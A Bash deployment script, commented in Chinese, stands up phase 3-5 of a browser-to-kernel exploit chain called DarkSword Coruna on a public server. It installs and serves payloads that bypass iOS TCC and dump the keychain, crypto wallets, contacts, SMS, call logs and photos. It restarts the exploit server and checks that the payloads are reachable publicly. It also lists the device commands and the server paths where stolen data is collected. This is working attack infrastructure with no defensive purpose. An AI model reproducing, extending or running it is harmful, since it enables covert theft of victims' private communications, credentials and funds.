#!/usr/bin/env bash
# ============================================================
#  DarkSword Coruna Phase 3-5 部署脚本 (aa1234.dpdns.org)
#  ============================================================
#  部署 6 个新增 payload:
#    - payloads/tcc_bypass.js
#    - payloads/keychain_dump.js
#    - payloads/wallet_scan.js
#    - payloads/addressbook_dump.js
#    - payloads/sms_calls_dump.js
#    - payloads/photos_dump.js
#  + 更新 exploits/chain_loader.js (Stage 5 后激活 SOFT-FALLBACK bridge)
#  + 更新 exploits/native_bridge/coruna_bridge_loader.js (加载 Phase 3-5)
#  ============================================================
set -uo pipefail

# ============== 配置 ==============
BASE="/www/wwwroot/coruna/server"
BAK="/www/wwwroot/coruna/_bak_phase3_5_$(date +%Y%m%d_%H%M%S)"
LOG_TAG="phase3_5_$(date +%H%M%S)"

# 配色
G="\033[32m"; Y="\033[33m"; R="\033[31m"; N="\033[0m"

# ============== STEP-0: 环境检查 ==============
echo -e "${Y}============== STEP-0  env check START ==============${N}"
if [ ! -d "$BASE" ]; then
  echo -e "${R}FAIL: $BASE 不存在${N}"
  exit 1
fi
mkdir -p "$BAK"
echo "BASE=$BASE"
echo "BAK=$BAK"
which python3 >/dev/null 2>&1 && echo -e "  python3: ${G}OK${N}" || echo -e "  python3: ${R}MISSING${N}"
echo -e "${Y}============== STEP-0  env check DONE ==============${N}\n"

# ============== STEP-1: 备份现有文件 ==============
echo -e "${Y}============== STEP-1  backup START ==============${N}"
for f in \
    "payloads/tcc_bypass.js" \
    "payloads/keychain_dump.js" \
    "payloads/wallet_scan.js" \
    "payloads/addressbook_dump.js" \
    "payloads/sms_calls_dump.js" \
    "payloads/photos_dump.js" \
    "exploits/chain_loader.js" \
    "exploits/native_bridge/coruna_bridge_loader.js"
do
  if [ -f "$BASE/$f" ]; then
    mkdir -p "$BAK/$(dirname $f)"
    cp "$BASE/$f" "$BAK/$f"
    echo "  BACKUP $f"
  fi
done
echo -e "${Y}============== STEP-1  backup DONE ==============${N}\n"

# ============== STEP-2: 文件落盘检查 ==============
echo -e "${Y}============== STEP-2  file presence START ==============${N}"
LIST=(
  "payloads/tcc_bypass.js"
  "payloads/keychain_dump.js"
  "payloads/wallet_scan.js"
  "payloads/addressbook_dump.js"
  "payloads/sms_calls_dump.js"
  "payloads/photos_dump.js"
  "exploits/chain_loader.js"
  "exploits/native_bridge/coruna_bridge_loader.js"
)
ALL_OK=1
for f in "${LIST[@]}"; do
  if [ -f "$BASE/$f" ]; then
    sz=$(stat -c%s "$BASE/$f" 2>/dev/null || stat -f%z "$BASE/$f" 2>/dev/null)
    echo -e "  ${G}OK${N}   $f  (${sz}B)"
  else
    echo -e "  ${R}MISSING${N}  $f"
    ALL_OK=0
  fi
done
if [ $ALL_OK -ne 1 ]; then
  echo -e "${R}FAIL: 部分文件缺失, 请先 scp 上传到 $BASE/${N}"
  exit 1
fi
echo -e "${Y}============== STEP-2  file presence DONE ==============${N}\n"

# ============== STEP-3: JS 语法检查 (本地 node 可用时) ==============
echo -e "${Y}============== STEP-3  JS syntax check START ==============${N}"
which node >/dev/null 2>&1
if [ $? -eq 0 ]; then
  for f in \
      "payloads/tcc_bypass.js" \
      "payloads/keychain_dump.js" \
      "payloads/wallet_scan.js" \
      "payloads/addressbook_dump.js" \
      "payloads/sms_calls_dump.js" \
      "payloads/photos_dump.js" \
      "exploits/chain_loader.js" \
      "exploits/native_bridge/coruna_bridge_loader.js"
  do
    out=$(node --check "$BASE/$f" 2>&1)
    if [ $? -eq 0 ]; then
      echo -e "  ${G}OK${N}  $f"
    else
      echo -e "  ${R}FAIL${N} $f :: $out"
    fi
  done
else
  echo "  WARN: node 命令不存在, 跳过 JS 语法检查 (HTTP 服务由 Python 提供, 不影响实际攻击)"
fi
echo -e "${Y}============== STEP-3  JS syntax check DONE ==============${N}\n"

# ============== STEP-4: 重启 exploit_server.py ==============
echo -e "${Y}============== STEP-4  restart service START ==============${N}"
# Supervisor 优先
SUPCTL=""
if which supervisorctl >/dev/null 2>&1; then
  if supervisorctl status coruna_exploit 2>/dev/null | grep -q "RUNNING"; then
    supervisorctl restart coruna_exploit
    echo "  supervisor: coruna_exploit restarted"
  elif supervisorctl status coruna 2>/dev/null | grep -q "RUNNING"; then
    supervisorctl restart coruna
    echo "  supervisor: coruna restarted"
  else
    SUPCTL="fallback"
  fi
else
  SUPCTL="fallback"
fi

if [ "$SUPCTL" = "fallback" ]; then
  echo "  no supervisor → fallback nohup"
  # 找出旧 PID
  OLD_PID=$(ps aux | grep '[e]xploit_server.py' | awk '{print $2}' | head -n1)
  if [ -n "$OLD_PID" ]; then
    echo "  killing old exploit_server.py PID=$OLD_PID"
    kill -9 "$OLD_PID" 2>/dev/null
    sleep 1
  fi
  cd "$BASE" && nohup python3 exploit_server.py > /tmp/coruna_exploit.out.log 2>&1 &
  NEW_PID=$!
  sleep 2
  echo "  new exploit_server.py PID=$NEW_PID"
fi
echo -e "${Y}============== STEP-4  restart service DONE ==============${N}\n"

# ============== STEP-5: HTTP 端点探测 ==============
echo -e "${Y}============== STEP-5  HTTP endpoint probe START ==============${N}"
sleep 3
URLS=(
  "http://127.0.0.1:7070/payloads/tcc_bypass.js"
  "http://127.0.0.1:7070/payloads/keychain_dump.js"
  "http://127.0.0.1:7070/payloads/wallet_scan.js"
  "http://127.0.0.1:7070/payloads/addressbook_dump.js"
  "http://127.0.0.1:7070/payloads/sms_calls_dump.js"
  "http://127.0.0.1:7070/payloads/photos_dump.js"
  "http://127.0.0.1:7070/exploits/chain_loader.js"
  "http://127.0.0.1:7070/exploits/native_bridge/coruna_bridge_loader.js"
)
HTTP_OK=0
HTTP_TOTAL=0
for url in "${URLS[@]}"; do
  HTTP_TOTAL=$((HTTP_TOTAL+1))
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null || echo "000")
  if [ "$code" = "200" ]; then
    echo -e "  ${G}200${N}  $url"
    HTTP_OK=$((HTTP_OK+1))
  else
    echo -e "  ${R}${code}${N}  $url"
  fi
done
echo "  HTTP probe: $HTTP_OK / $HTTP_TOTAL OK"
echo -e "${Y}============== STEP-5  HTTP endpoint probe DONE ==============${N}\n"

# ============== STEP-6: 公网端点探测 ==============
echo -e "${Y}============== STEP-6  public endpoint probe START ==============${N}"
PUB_OK=0; PUB_TOTAL=0
for host in "aa1234.dpdns.org:7070"; do
  for path in "/payloads/tcc_bypass.js" "/payloads/keychain_dump.js" "/payloads/wallet_scan.js" "/payloads/photos_dump.js" "/exploits/chain_loader.js"; do
    PUB_TOTAL=$((PUB_TOTAL+1))
    url="http://${host}${path}"
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$url" 2>/dev/null || echo "000")
    if [ "$code" = "200" ]; then
      echo -e "  ${G}200${N}  $url"
      PUB_OK=$((PUB_OK+1))
    else
      echo -e "  ${Y}${code}${N}  $url"
    fi
  done
done
echo "  Public probe: $PUB_OK / $PUB_TOTAL OK"
echo -e "${Y}============== STEP-6  public endpoint probe DONE ==============${N}\n"

# ============== STEP-7: 真机测试指引 ==============
echo -e "${Y}============== STEP-7  real device test guide START ==============${N}"
cat <<'EOF'

========== 真机测试命令 (Safari 打开 group.html 后) ==========

1. Phase 1-2 基础 (BROWSER-ONLY, 无需 kexploit)
   点击 dashboard 按钮:
     - 设备信息
     - 获取位置
     - 截屏
     - 震动
     - 弹窗

2. Phase 3-5 真 kexploit 路径 (需先在 macOS 上编译 WASM):
   发送命令:
     ds_ktcc
     ds_kbrowse (执行 shell)
     ds_kfind  (找文件)
     ds_kcontacts (dump 通讯录 → vCard)
     ds_ksms      (dump SMS)
     ds_kcalls    (dump 通话记录)
     ds_kwallet   (扫描 12 种钱包 App)
     ds_kkeychain (dump keychain-2.db)
     ds_kstatus   (查询 native bridge + Phase 3-5 模块状态)

3. 真机验证关键点:
   a. Safari DevTools console 应当看到:
      [coruna-bridge] native bridge installed: true
      [coruna-bridge] (wasm=true, modules=tcc_bypass,keychain_dump,...)
   b. 失败时 fallback 应当看到:
      [coruna-bridge] SOFT-FALLBACK mode
   c. 错误时: 检查 /tmp/coruna_exploit.out.log

4. exfil 文件位置:
   /www/wwwroot/coruna/server/exfil/contacts_*.vcf
   /www/wwwroot/coruna/server/exfil/sms_*.json
   /www/wwwroot/coruna/server/exfil/calls_*.json
   /www/wwwroot/coruna/server/exfil/wallets_*.json
   /www/wwwroot/coruna/server/exfil/keychain_*.json
   /www/wwwroot/coruna/server/exfil/photos_*.zip
   /www/wwwroot/coruna/server/exfil/tcc_bypass_*.json
EOF
echo -e "${Y}============== STEP-7  real device test guide DONE ==============${N}\n"

# ============== STEP-8: 总结 ==============
echo -e "${Y}============== STEP-8  summary START ==============${N}"
echo -e "  HTTP 本地:    ${G}${HTTP_OK}${N} / ${HTTP_TOTAL}"
echo -e "  HTTP 公网:    ${G}${PUB_OK}${N} / ${PUB_TOTAL}"
echo -e "  备份位置:     $BAK"
echo -e "  新增 payload: 6 个 (tcc/keychain/wallet/contacts/sms/photos)"
echo -e "  升级 payload: 2 个 (chain_loader + bridge_loader)"
echo
echo "下次 macOS 编译 WASM 后, 用下面命令上传:"
echo "  scp /tmp/coruna_bridge_out/kexploit_wasm.js kexploit_wasm.wasm \\"
echo "      root@aa1234.dpdns.org:/www/wwwroot/coruna/server/exploits/native_bridge/"
echo
echo -e "${Y}============== STEP-8  summary DONE ==============${N}"

exit 0
